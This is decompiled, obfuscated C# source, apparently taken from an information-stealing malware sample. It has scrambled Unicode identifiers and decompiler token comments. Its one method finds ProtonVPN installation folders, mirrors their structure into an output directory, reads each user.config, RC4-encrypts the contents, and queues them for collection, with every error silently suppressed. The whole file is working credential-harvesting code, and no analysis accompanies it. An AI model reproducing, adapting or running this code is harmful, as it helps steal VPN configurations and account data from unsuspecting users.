using System;
using System.IO;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x02000011 RID: 17
	internal class Class_10
	{
		// Token: 0x0600003F RID: 63 RVA: 0x00003BAC File Offset: 0x00001DAC
		public static void xmethod_31(string str_0)
		{
			try
			{
				string text = Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm + "\\ProtonVPN";
				if (Directory.Exists(text))
				{
					string[] directories = Directory.GetDirectories(text ?? "");
					Directory.CreateDirectory(str_0 + "\\Vpn\\ProtonVPN\\");
					foreach (string text2 in directories)
					{
						if (text2.StartsWith(text + "\\ProtonVPN\\ProtonVPN.exe"))
						{
							string name = new DirectoryInfo(text2).Name;
							string[] directories2 = Directory.GetDirectories(text2);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								str_0,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(string.Concat(new string[]
							{
								str_0,
								"\\Vpn\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}), Class_47.RC4(File.ReadAllBytes(directories2[0] + "\\user.config")));
							Class_10.field_0++;
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000034 RID: 52
		public static int field_0;
	}
}
